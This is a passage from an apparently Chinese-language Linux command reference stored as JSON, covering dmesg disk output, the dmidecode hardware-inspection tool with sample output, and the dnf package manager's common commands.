(reserved)\n</code></pre>\n<p>查看硬盘基础信息</p>\n<pre><code class=\"language-shell\">dmesg | grep sda\n\n[    <span class=\"hljs-number\">2.442555</span>] sd <span class=\"hljs-number\">0:0:0:0</span>: [sda] <span class=\"hljs-number\">488281250</span> <span class=\"hljs-number\">512</span>-byte logical blocks: (<span class=\"hljs-number\">250</span> GB/<span class=\"hljs-number\">232</span> GiB)\n[    <span class=\"hljs-number\">2.442590</span>] sd <span class=\"hljs-number\">0:0:0:0</span>: [sda] Write Protect is off\n[    <span class=\"hljs-number\">2.442592</span>] sd <span class=\"hljs-number\">0:0:0:0</span>: [sda] Mode Sense: <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">3</span>a <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>\n[    <span class=\"hljs-number\">2.442607</span>] sd <span class=\"hljs-number\">0:0:0:0</span>: [sda] Write cache: enabled, read cache: enabled, doesn't support DPO or FUA\n[    <span class=\"hljs-number\">2.447533</span>]  sda: sda1\n[    <span class=\"hljs-number\">2.448503</span>] sd <span class=\"hljs-number\">0:0:0:0</span>: [sda] Attached SCSI disk\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "dmidecode",
        "des": "在Linux系统下获取有关硬件方面的信息",
        "body": "<h1 id=\"dmidecode\">dmidecode</h1>\n<p>在Linux系统下获取有关硬件方面的信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>dmidecode命令</strong> 可以让你在Linux系统下获取有关硬件方面的信息。dmidecode的作用是将DMI数据库中的信息解码，以可读的文本方式显示。由于DMI信息可以人为修改，因此里面的信息不一定是系统准确的信息。dmidecode遵循SMBIOS/DMI标准，其输出的信息包括BIOS、系统、主板、处理器、内存、缓存等等。</p>\n<p>DMI（Desktop Management Interface,DMI）就是帮助收集电脑系统信息的管理系统，DMI信息的收集必须在严格遵照SMBIOS规范的前提下进行。SMBIOS（System Management BIOS）是主板或系统制造者以标准格式显示产品管理信息所需遵循的统一规范。SMBIOS和DMI是由行业指导机构Desktop Management Task Force(DMTF)起草的开放性的技术标准，其中DMI设计适用于任何的平台和操作系统。</p>\n<p>DMI充当了管理工具和系统层之间接口的角色。它建立了标准的可管理系统更加方便了电脑厂商和用户对系统的了解。DMI的主要组成部分是Management Information Format(MIF)数据库。这个数据库包括了所有有关电脑系统和配件的信息。通过DMI，用户可以获取序列号、电脑厂商、串口信息以及其它系统配件信息。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dmidecode</span><span class=\"hljs-meta\"> [选项]</span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-d：(default:/dev/mem)从设备文件读取信息，输出内容与不加参数标准输出相同。</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息。</span>\n<span class=\"hljs-deletion\">-s：只显示指定DMI字符串的信息。(string)</span>\n<span class=\"hljs-deletion\">-t：只显示指定条目的信息。(type)</span>\n<span class=\"hljs-deletion\">-u：显示未解码的原始条目内容。</span>\n<span class=\"hljs-deletion\">--dump-bin file：将DMI数据转储到一个二进制文件中。</span>\n<span class=\"hljs-deletion\">--from-dump FILE：从一个二进制文件读取DMI数据。</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<p> <strong>dmidecode参数string及type列表：</strong> </p>\n<p>（1）Valid string keywords are：</p>\n<ul>\n<li>  bios-vendor</li>\n<li>  bios-version</li>\n<li>  bios-release-date</li>\n<li>  system-manufacturer</li>\n<li>  system-product-name</li>\n<li>  system-version</li>\n<li>  system-serial-number</li>\n<li>  system-uuid</li>\n<li>  baseboard-manufacturer</li>\n<li>  baseboard-product-name</li>\n<li>  baseboard-version</li>\n<li>  baseboard-serial-number</li>\n<li>  baseboard-asset-tag</li>\n<li>  chassis-manufacturer</li>\n<li>  chassis-type</li>\n<li>  chassis-version</li>\n<li>  chassis-serial-number</li>\n<li>  chassis-asset-tag</li>\n<li>  processor-family</li>\n<li>  processor-manufacturer</li>\n<li>  processor-version</li>\n<li>  processor-frequency</li>\n</ul>\n<p>（2）Valid type keywords are：</p>\n<ul>\n<li>  bios</li>\n<li>  system</li>\n<li>  baseboard</li>\n<li>  chassis</li>\n<li>  processor</li>\n<li>  memory</li>\n<li>  Cache</li>\n<li>  connector</li>\n<li>  slot</li>\n</ul>\n<p>（3）type全部编码列表：</p>\n<ul>\n<li>  BIOS</li>\n<li>  System</li>\n<li>  Base Board</li>\n<li>  Chassis</li>\n<li>  Processor</li>\n<li>  Memory Controller</li>\n<li>  Memory Module</li>\n<li>  Cache</li>\n<li>  Port Connector</li>\n<li>  System Slots</li>\n<li>  On Board Devices</li>\n<li>  OEM Strings</li>\n<li>  System Configuration Options</li>\n<li>  BIOS Language</li>\n<li>  Group Associations</li>\n<li>  System Event Log</li>\n<li>  Physical Memory Array</li>\n<li>  Memory Device</li>\n<li>  32-bit Memory Error</li>\n<li>  Memory Array Mapped Address</li>\n<li>  Memory Device Mapped Address</li>\n<li>  Built-in Pointing Device</li>\n<li>  Portable Battery</li>\n<li>  System Reset</li>\n<li>  Hardware Security</li>\n<li>  System Power Controls</li>\n<li>  Voltage Probe</li>\n<li>  Cooling Device</li>\n<li>  Temperature Probe</li>\n<li>  Electrical Current Probe</li>\n<li>  Out-of-band Remote Access</li>\n<li>  Boot Integrity Services</li>\n<li>  System Boot</li>\n<li>  64-bit Memory Error</li>\n<li>  Management Device</li>\n<li>  Management Device Component</li>\n<li>  Management Device Threshold Data</li>\n<li>  Memory Channel</li>\n<li>  IPMI Device</li>\n<li>  Power Supply</li>\n<li>  Additional Information</li>\n<li>  Onboard Device</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">dmidecode -t<span class=\"hljs-number\"> 1 </span> <span class=\"hljs-comment\"># 查看服务器信息</span>\ndmidecode | grep 'Product Name' <span class=\"hljs-comment\"># 查看服务器型号 </span>\ndmidecode |grep 'Serial Number' <span class=\"hljs-comment\"># 查看主板的序列号 </span>\ndmidecode -t<span class=\"hljs-number\"> 2 </span> <span class=\"hljs-comment\"># 查看主板信息</span>\ndmidecode -s system-serial-number <span class=\"hljs-comment\"># 查看系统序列号 </span>\ndmidecode -t memory <span class=\"hljs-comment\"># 查看内存信息 </span>\ndmidecode -t<span class=\"hljs-number\"> 11 </span><span class=\"hljs-comment\"># 查看OEM信息 </span>\ndmidecode -t<span class=\"hljs-number\"> 17 </span><span class=\"hljs-comment\"># 查看内存条数</span>\ndmidecode -t<span class=\"hljs-number\"> 16 </span><span class=\"hljs-comment\"># 查询内存信息</span>\ndmidecode -t<span class=\"hljs-number\"> 4 </span> <span class=\"hljs-comment\"># 查看CPU信息</span>\n\ncat /proc/scsi/scsi <span class=\"hljs-comment\"># 查看服务器硬盘信息</span>\n</code></pre>\n<p>不带选项执行dmidecode命令通常会输出所有的硬件信息。dmidecode命令有个很有用的选项-t，可以按指定类型输出相关信息，假如要获得处理器方面的信息，则可以执行：</p>\n<pre><code class=\"language-shell\">[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># dmidecode -t processor</span>\n<span class=\"hljs-comment\"># dmidecode 2.11</span>\n<span class=\"hljs-string\">SMBIOS</span> <span class=\"hljs-number\">2.5</span> <span class=\"hljs-string\">present.</span>\n\n<span class=\"hljs-string\">Handle</span> <span class=\"hljs-number\">0x0001</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">DMI</span> <span class=\"hljs-string\">type</span> <span class=\"hljs-number\">4</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">40</span> <span class=\"hljs-string\">bytes</span>\n<span class=\"hljs-string\">Processor</span> <span class=\"hljs-string\">Information</span>\n        <span class=\"hljs-attr\">Socket Designation:</span> <span class=\"hljs-string\">Node</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">Socket</span> <span class=\"hljs-number\">1</span>\n        <span class=\"hljs-attr\">Type:</span> <span class=\"hljs-string\">Central</span> <span class=\"hljs-string\">Processor</span>\n        <span class=\"hljs-attr\">Family:</span> <span class=\"hljs-string\">Xeon</span> <span class=\"hljs-string\">MP</span>\n        <span class=\"hljs-attr\">Manufacturer:</span> <span class=\"hljs-string\">Intel(R)</span> <span class=\"hljs-string\">Corporation</span>\n        <span class=\"hljs-attr\">id:</span> <span class=\"hljs-string\">C2</span> <span class=\"hljs-number\">06</span> <span class=\"hljs-number\">02</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-string\">FF</span> <span class=\"hljs-string\">FB</span> <span class=\"hljs-string\">EB</span> <span class=\"hljs-string\">BF</span>\n        <span class=\"hljs-attr\">Signature:</span> <span class=\"hljs-string\">Type</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Family</span> <span class=\"hljs-number\">6</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Model</span> <span class=\"hljs-number\">44</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Stepping</span> <span class=\"hljs-number\">2</span>\n        <span class=\"hljs-attr\">Flags:</span>\n                <span class=\"hljs-string\">FPU</span> <span class=\"hljs-string\">(Floating-point</span> <span class=\"hljs-string\">unit</span> <span class=\"hljs-string\">on-chip)</span>\n                <span class=\"hljs-string\">VME</span> <span class=\"hljs-string\">(Virtual</span> <span class=\"hljs-string\">mode</span> <span class=\"hljs-string\">extension)</span>\n                <span class=\"hljs-string\">DE</span> <span class=\"hljs-string\">(Debugging</span> <span class=\"hljs-string\">extension)</span>\n                <span class=\"hljs-string\">PSE</span> <span class=\"hljs-string\">(Page</span> <span class=\"hljs-string\">size</span> <span class=\"hljs-string\">extension)</span>\n                <span class=\"hljs-string\">TSC</span> <span class=\"hljs-string\">(time</span> <span class=\"hljs-string\">stamp</span> <span class=\"hljs-string\">counter)</span>\n                <span class=\"hljs-string\">MSR</span> <span class=\"hljs-string\">(Model</span> <span class=\"hljs-string\">specific</span> <span class=\"hljs-string\">registers)</span>\n                <span class=\"hljs-string\">PAE</span> <span class=\"hljs-string\">(Physical</span> <span class=\"hljs-string\">address</span> <span class=\"hljs-string\">extension)</span>\n                <span class=\"hljs-string\">MCE</span> <span class=\"hljs-string\">(Machine</span> <span class=\"hljs-string\">check</span> <span class=\"hljs-string\">exception)</span>\n                <span class=\"hljs-string\">CX8</span> <span class=\"hljs-string\">(CMPXCHG8</span> <span class=\"hljs-string\">instruction</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">APIC</span> <span class=\"hljs-string\">(On-chip</span> <span class=\"hljs-string\">APIC</span> <span class=\"hljs-string\">hardware</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">SEP</span> <span class=\"hljs-string\">(Fast</span> <span class=\"hljs-string\">system</span> <span class=\"hljs-string\">call)</span>\n                <span class=\"hljs-string\">MTRR</span> <span class=\"hljs-string\">(Memory</span> <span class=\"hljs-string\">type</span> <span class=\"hljs-string\">range</span> <span class=\"hljs-string\">registers)</span>\n                <span class=\"hljs-string\">PGE</span> <span class=\"hljs-string\">(Page</span> <span class=\"hljs-string\">global</span> <span class=\"hljs-string\">enable)</span>\n                <span class=\"hljs-string\">MCA</span> <span class=\"hljs-string\">(Machine</span> <span class=\"hljs-string\">check</span> <span class=\"hljs-string\">architecture)</span>\n                <span class=\"hljs-string\">CMOV</span> <span class=\"hljs-string\">(Conditional</span> <span class=\"hljs-string\">move</span> <span class=\"hljs-string\">instruction</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">PAT</span> <span class=\"hljs-string\">(Page</span> <span class=\"hljs-string\">attribute</span> <span class=\"hljs-string\">table)</span>\n                <span class=\"hljs-string\">PSE-36</span> <span class=\"hljs-string\">(36-bit</span> <span class=\"hljs-string\">page</span> <span class=\"hljs-string\">size</span> <span class=\"hljs-string\">extension)</span>\n                <span class=\"hljs-string\">CLFSH</span> <span class=\"hljs-string\">(CLFLUSH</span> <span class=\"hljs-string\">instruction</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">DS</span> <span class=\"hljs-string\">(Debug</span> <span class=\"hljs-string\">store)</span>\n                <span class=\"hljs-string\">ACPI</span> <span class=\"hljs-string\">(ACPI</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">MMX</span> <span class=\"hljs-string\">(MMX</span> <span class=\"hljs-string\">technology</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">FXSR</span> <span class=\"hljs-string\">(FXSAVE</span> <span class=\"hljs-string\">and</span> <span class=\"hljs-string\">FXSTOR</span> <span class=\"hljs-string\">instructions</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">SSE</span> <span class=\"hljs-string\">(Streaming</span> <span class=\"hljs-string\">SIMD</span> <span class=\"hljs-string\">extensions)</span>\n                <span class=\"hljs-string\">SSE2</span> <span class=\"hljs-string\">(Streaming</span> <span class=\"hljs-string\">SIMD</span> <span class=\"hljs-string\">extensions</span> <span class=\"hljs-number\">2</span><span class=\"hljs-string\">)</span>\n                <span class=\"hljs-string\">ss</span> <span class=\"hljs-string\">(Self-snoop)</span>\n                <span class=\"hljs-string\">HTT</span> <span class=\"hljs-string\">(Multi-threading)</span>\n                <span class=\"hljs-string\">TM</span> <span class=\"hljs-string\">(Thermal</span> <span class=\"hljs-string\">monitor</span> <span class=\"hljs-string\">supported)</span>\n                <span class=\"hljs-string\">PBE</span> <span class=\"hljs-string\">(Pending</span> <span class=\"hljs-string\">break</span> <span class=\"hljs-string\">enabled)</span>\n        <span class=\"hljs-attr\">Version:</span> <span class=\"hljs-string\">Intel(R)</span> <span class=\"hljs-string\">Xeon(R)</span> <span class=\"hljs-string\">CPU</span>           <span class=\"hljs-string\">E5620</span>  <span class=\"hljs-string\">@</span> <span class=\"hljs-number\">2.</span><span class=\"hljs-string\">40GHz</span>\n        <span class=\"hljs-attr\">Voltage:</span> <span class=\"hljs-number\">1.2</span> <span class=\"hljs-string\">V</span>\n        <span class=\"hljs-attr\">External Clock:</span> <span class=\"hljs-number\">5866 </span><span class=\"hljs-string\">MHz</span>\n        <span class=\"hljs-attr\">Max Speed:</span> <span class=\"hljs-number\">4400 </span><span class=\"hljs-string\">MHz</span>\n        <span class=\"hljs-attr\">Current Speed:</span> <span class=\"hljs-number\">2400 </span><span class=\"hljs-string\">MHz</span>\n        <span class=\"hljs-attr\">Status:</span> <span class=\"hljs-string\">Populated,</span> <span class=\"hljs-string\">Enabled</span>\n        <span class=\"hljs-attr\">Upgrade:</span> <span class=\"hljs-string\">ZIF</span> <span class=\"hljs-string\">Socket</span>\n        <span class=\"hljs-attr\">L1 Cache Handle:</span> <span class=\"hljs-number\">0x0002</span>\n        <span class=\"hljs-attr\">L2 Cache Handle:</span> <span class=\"hljs-number\">0x0003</span>\n        <span class=\"hljs-attr\">L3 Cache Handle:</span> <span class=\"hljs-number\">0x0004</span>\n        <span class=\"hljs-attr\">Serial Number:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Asset Tag:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Part Number:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Core Count:</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-attr\">Core Enabled:</span> <span class=\"hljs-number\">4</span>\n        <span class=\"hljs-attr\">Thread Count:</span> <span class=\"hljs-number\">8</span>\n        <span class=\"hljs-attr\">Characteristics:</span>\n                <span class=\"hljs-number\">64</span><span class=\"hljs-string\">-bit</span> <span class=\"hljs-string\">capable</span>\n\n<span class=\"hljs-string\">Handle</span> <span class=\"hljs-number\">0x0055</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">DMI</span> <span class=\"hljs-string\">type</span> <span class=\"hljs-number\">4</span><span class=\"hljs-string\">,</span> <span class=\"hljs-number\">40</span> <span class=\"hljs-string\">bytes</span>\n<span class=\"hljs-string\">Processor</span> <span class=\"hljs-string\">Information</span>\n        <span class=\"hljs-attr\">Socket Designation:</span> <span class=\"hljs-string\">Node</span> <span class=\"hljs-number\">1</span> <span class=\"hljs-string\">Socket</span> <span class=\"hljs-number\">2</span>\n        <span class=\"hljs-attr\">Type:</span> <span class=\"hljs-string\">Central</span> <span class=\"hljs-string\">Processor</span>\n        <span class=\"hljs-attr\">Family:</span> <span class=\"hljs-string\">Xeon</span> <span class=\"hljs-string\">MP</span>\n        <span class=\"hljs-attr\">Manufacturer:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">ID:</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span> <span class=\"hljs-number\">00</span>\n        <span class=\"hljs-attr\">Signature:</span> <span class=\"hljs-string\">Type</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Family</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Model</span> <span class=\"hljs-number\">0</span><span class=\"hljs-string\">,</span> <span class=\"hljs-string\">Stepping</span> <span class=\"hljs-number\">0</span>\n        <span class=\"hljs-attr\">Flags:</span> <span class=\"hljs-string\">None</span>\n        <span class=\"hljs-attr\">Version:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Voltage:</span> <span class=\"hljs-number\">1.2</span> <span class=\"hljs-string\">V</span>\n        <span class=\"hljs-attr\">External Clock:</span> <span class=\"hljs-number\">5866 </span><span class=\"hljs-string\">MHz</span>\n        <span class=\"hljs-attr\">Max Speed:</span> <span class=\"hljs-number\">4400 </span><span class=\"hljs-string\">MHz</span>\n        <span class=\"hljs-attr\">Current Speed:</span> <span class=\"hljs-string\">Unknown</span>\n        <span class=\"hljs-attr\">Status:</span> <span class=\"hljs-string\">Unpopulated</span>\n        <span class=\"hljs-attr\">Upgrade:</span> <span class=\"hljs-string\">ZIF</span> <span class=\"hljs-string\">Socket</span>\n        <span class=\"hljs-attr\">L1 Cache Handle:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Provided</span>\n        <span class=\"hljs-attr\">L2 Cache Handle:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Provided</span>\n        <span class=\"hljs-attr\">L3 Cache Handle:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Provided</span>\n        <span class=\"hljs-attr\">Serial Number:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Asset Tag:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Part Number:</span> <span class=\"hljs-string\">Not</span> <span class=\"hljs-string\">Specified</span>\n        <span class=\"hljs-attr\">Characteristics:</span> <span class=\"hljs-string\">None</span>\n</code></pre>\n<p>查看内存的插槽数，已经使用多少插槽。每条内存多大，已使用内存多大</p>\n<pre><code class=\"language-shell\">dmidecode|<span class=\"hljs-keyword\">grep</span> -P -A5 <span class=\"hljs-string\">\"Memory\\s+Device\"</span>|<span class=\"hljs-keyword\">grep</span> <span class=\"hljs-keyword\">Size</span>|<span class=\"hljs-keyword\">grep</span> -v Range \n\n#   <span class=\"hljs-keyword\">Size</span>: <span class=\"hljs-number\">2048</span> MB\n#   <span class=\"hljs-keyword\">Size</span>: <span class=\"hljs-number\">2048</span> MB\n#   <span class=\"hljs-keyword\">Size</span>: <span class=\"hljs-number\">4096</span> MB\n#   <span class=\"hljs-keyword\">Size</span>: No Module Installed\n</code></pre>\n<p>查看内存支持的最大内存容量</p>\n<pre><code class=\"language-shell\">dmidecode|<span class=\"hljs-keyword\">grep</span> -P <span class=\"hljs-string\">'Maximum\\s+Capacity'</span>\n\n<span class=\"hljs-comment\">#  Maximum Capacity: 16 GB</span>\n</code></pre>\n<p>查看内存的频率</p>\n<pre><code class=\"language-shell\">dmidecode|grep -A16 <span class=\"hljs-string\">\"Memory Device\"</span>\n\n<span class=\"hljs-comment\">#   Memory Device</span>\n<span class=\"hljs-comment\">#     Array Handle: 0x1000</span>\n<span class=\"hljs-comment\">#     Error Information Handle: Not Provided</span>\n<span class=\"hljs-comment\">#     Total Width: 72 bits</span>\n<span class=\"hljs-comment\">#     Data Width: 64 bits</span>\n<span class=\"hljs-comment\">#     Size: 2048 MB</span>\n<span class=\"hljs-comment\">#     Form Factor: DIMM</span>\n<span class=\"hljs-comment\">#     Set: 1</span>\n<span class=\"hljs-comment\">#     Locator: DIMM_A1</span>\n<span class=\"hljs-comment\">#     Bank Locator: Not Specified</span>\n<span class=\"hljs-comment\">#     Type: DDR3</span>\n<span class=\"hljs-comment\">#     Type Detail: Synchronous Unbuffered (Unregistered)</span>\n<span class=\"hljs-comment\">#     Speed: 1333 MHz</span>\n<span class=\"hljs-comment\">#     Manufacturer: 00CE000080CE</span>\n<span class=\"hljs-comment\">#     Serial Number: 4830F3E1</span>\n<span class=\"hljs-comment\">#     Asset Tag: 01093200</span>\n<span class=\"hljs-comment\">#     Part Number: M391B5673EH1-CH9</span>\n<span class=\"hljs-comment\">#   --</span>\n<span class=\"hljs-comment\">#   Memory Device</span>\n<span class=\"hljs-comment\">#     Array Handle: 0x1000</span>\n<span class=\"hljs-comment\">#     Error Information Handle: Not Provided</span>\n<span class=\"hljs-comment\">#     Total Width: 72 bits</span>\n<span class=\"hljs-comment\">#     Data Width: 64 bits</span>\n<span class=\"hljs-comment\">#     Size: 2048 MB</span>\n<span class=\"hljs-comment\">#     Form Factor: DIMM</span>\n<span class=\"hljs-comment\">#     Set: 1</span>\n<span class=\"hljs-comment\">#     Locator: DIMM_A2</span>\n<span class=\"hljs-comment\">#     Bank Locator: Not Specified</span>\n<span class=\"hljs-comment\">#     Type: DDR3</span>\n<span class=\"hljs-comment\">#     Type Detail: Synchronous Unbuffered (Unregistered)</span>\n<span class=\"hljs-comment\">#     Speed: 1333 MHz</span>\n<span class=\"hljs-comment\">#     Manufacturer: 00AD000080AD</span>\n<span class=\"hljs-comment\">#     Serial Number: 1BA1F0B5</span>\n<span class=\"hljs-comment\">#     Asset Tag: 01110900</span>\n<span class=\"hljs-comment\">#     Part Number: HMT325U7BFR8C-H9</span>\n<span class=\"hljs-comment\">#   --</span>\n\ndmidecode|grep -A16 <span class=\"hljs-string\">\"Memory Device\"</span>|grep <span class=\"hljs-string\">'Speed'</span>\n\n<span class=\"hljs-comment\">#  Speed: 1333 MHz</span>\n<span class=\"hljs-comment\">#  Speed: 1333 MHz</span>\n<span class=\"hljs-comment\">#  Speed: 1333 MHz</span>\n<span class=\"hljs-comment\">#  Speed: Unknown</span>\n\n```shell\n\n\n&lt;!-- Linux命令行搜索引擎：https:<span class=\"hljs-regexp\">//</span>jaywcjlove.github.io<span class=\"hljs-regexp\">/linux-command/</span> --&gt;\n</code></pre>\n"
    },
    {
        "title": "dnf",
        "des": "新一代的RPM软件包管理器",
        "body": "<h1 id=\"dnf\">dnf</h1>\n<p>新一代的RPM软件包管理器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>DNF</strong> 是新一代的rpm软件包管理器。他首先出现在 Fedora 18 这个发行版中。而最近，它取代了yum，正式成为 Fedora 22 的包管理器。</p>\n<p>DNF包管理器克服了YUM包管理器的一些瓶颈，提升了包括用户体验，内存占用，依赖分析，运行速度等多方面的内容。DNF使用 RPM, libsolv 和 hawkey 库进行包管理操作。尽管它没有预装在 CentOS 和 RHEL 7 中，但你可以在使用 YUM 的同时使用 DNF 。你可以在这里获得关于 DNF 的更多知识：《 DNF 代替 YUM ，你所不知道的缘由》</p>\n<p>DNF 的最新稳定发行版版本号是 1.0，发行日期是2015年5月11日。 这一版本的额 DNF 包管理器（包括在他之前的所有版本） 都大部分采用 Python 编写，发行许可为GPL v2.</p>\n<h3 id=\"安装-dnf-包管理器\">安装 DNF 包管理器</h3>\n<p>DNF 并未默认安装在 RHEL 或 CentOS 7系统中，但是 Fedora 22 已经默认使用 DNF .</p>\n<p>1、为了安装 DNF ，您必须先安装并启用 epel-release 依赖。</p>\n<p>在系统中执行以下命令：</p>\n<pre><code class=\"language-shell\">yum install epel-release\n</code></pre>\n<p>或者</p>\n<pre><code class=\"language-shell\">yum install epel-release -y\n</code></pre>\n<p>其实这里并没有强制使用”-y”的理由，相反的，在不使用”-y”的情况下，用户可以在安装过程中查看到底有哪些东西被安装进了系统。但对于没有这个需求的用户，您可以在 YUM 中使用”-y”参数来自动安装所有东西。</p>\n<p>2、使用 epel-release 依赖中的 YUM 命令来安装 DNF 包。在系统中执行以下命令：</p>\n<pre><code class=\"language-shell\">yum <span class=\"hljs-keyword\">install</span> dnf\n</code></pre>\n<p>然后， DNF 包管理器就被成功的安装到你的系统中了。接下来，是时候开始我们的教程了！在这个教程中，您将会学到27个用于 DNF 包管理器的命令。使用这些命令，你可以方便有效的管理您系统中的 RPM 软件包。现在，让我们开始学习 DNF 包管理器的27条常用命令吧！</p>\n<p><strong>查看 DNF 包管理器版本</strong> </p>\n<p>用处：该命令用于查看安装在您系统中的 DNF 包管理器的版本</p>\n<pre><code class=\"language-shell\">dnf –<span class=\"hljs-built_in\">version</span>\n</code></pre>\n<p>!Check-DNF-Version</p>\n<p><strong>查看系统中可用的 DNF 软件库</strong> </p>\n<p>用处：该命令用于显示系统中可用的 DNF 软件库</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf repolist</span>\n</code></pre>\n<p><strong>查看系统中可用和不可用的所有的 DNF 软件库</strong> </p>\n<p>用处：该命令用于显示系统中可用和不可用的所有的 DNF 软件库</p>\n<pre><code class=\"language-shell\">dnf repolist <span class=\"hljs-keyword\">all</span>\n</code></pre>\n<p><strong>列出所有 RPM 包</strong> </p>\n<p>用处：该命令用于列出用户系统上的所有来自软件库的可用软件包和所有已经安装在系统上的软件包</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf list</span>\n</code></pre>\n<p><strong>列出所有安装了的 RPM 包</strong> </p>\n<p>用处：该命令用于列出所有安装了的 RPM 包</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf list installed</span>\n</code></pre>\n<p><strong>列出所有可供安装的 RPM 包</strong> </p>\n<p>用处：该命令用于列出来自所有可用软件库的可供安装的软件包</p>\n<pre><code class=\"language-shell\">dnf list available\n</code></pre>\n<p><strong>搜索软件库中的 RPM 包</strong> </p>\n<p>用处：当你不知道你想要安装的软件的准确名称时，你可以用该命令来搜索软件包。你需要在”search”参数后面键入软件的部分名称来搜索。（在本例中我们使用”nano”）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf search nano</span>\n</code></pre>\n<p><strong>查找某一文件的提供者</strong> </p>\n<p>用处：当你想要查看是哪个软件包提供了系统中的某一文件时，你可以使用这条命令。（在本例中，我们将查找”/bin/bash”这个文件的提供者）</p>\n<pre><code class=\"language-shell\">dnf provides <span class=\"hljs-regexp\">/bin/</span>bash\n</code></pre>\n<p><strong>查看软件包详情</strong> </p>\n<p>用处：当你想在安装某一个软件包之前查看它的详细信息时，这条命令可以帮到你。（在本例中，我们将查看”nano”这一软件包的详细信息）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf</span> <span class=\"hljs-literal\">info</span> nano\n</code></pre>\n<p><strong>安装软件包</strong> </p>\n<p>用处：使用该命令，系统将会自动安装对应的软件及其所需的所有依赖（在本例中，我们将用该命令安装nano软件）</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-keyword\">install</span> nano\n</code></pre>\n<p><strong>升级软件包</strong> </p>\n<p>用处：该命令用于升级制定软件包（在本例中，我们将用命令升级”systemd”这一软件包）</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">dnf update systemd</span>\n</code></pre>\n<p><strong>检查系统软件包的更新</strong> </p>\n<p>用处：该命令用于检查系统中所有软件包的更新</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-keyword\">check</span>-<span class=\"hljs-keyword\">update</span>\n</code></pre>\n<p><strong>升级所有系统软件包</strong> </p>\n<p>用处：该命令用于升级系统中所有有可用升级的软件包</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-keyword\">update</span> 或 dnf upgrade\n</code></pre>\n<p><strong>删除软件包</strong> </p>\n<p>用处：删除系统中指定的软件包（在本例中我们将使用命令删除”nano”这一软件包）</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-built_in\">remove</span> nano 或 dnf erase nano\n</code></pre>\n<p><strong>删除无用孤立的软件包</strong> </p>\n<p>用处：当没有软件再依赖它们时，某一些用于解决特定软件依赖的软件包将会变得没有存在的意义，该命令就是用来自动移除这些没用的孤立软件包。</p>\n<pre><code class=\"language-shell\">dnf <span class=\"hljs-built_in\">auto</span>remove\n</code></pre>\n<p><strong>删除缓存的无用软件包</strong> </p>\n<p>用处：在使用 DNF 的过程中，会因为各种原因在系统中残留各种过时的文件和未完成的编译工程。我们可以使用该命令来删除这些没用的垃圾文件。</p>\n<pre><code class=\"language-shell\">dnf clean <span class=\"hljs-keyword\">all</span>\n</code></pre>\n<p><strong>获取有关某条命令的使用帮助</strong> 